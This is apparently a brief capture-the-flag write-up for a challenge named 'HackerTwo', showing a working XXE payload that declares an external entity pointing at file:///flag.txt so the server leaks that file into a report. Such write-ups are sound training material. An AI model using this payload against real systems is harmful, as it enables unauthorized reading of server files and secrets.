# HackerTwo

This challenge is a simple XXE (XML External Entity) attack. The goal is to read the contents of the file `/flag.txt` on the server.

To do this, we can submit a report in the XML format with the following content:

```xml
<!DOCTYPE bro [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<root>
    &xxe;
</root>
```

This will cause the server to read the contents of the file `/flag.txt` and include it in the report. We can then view the report to see the flag.
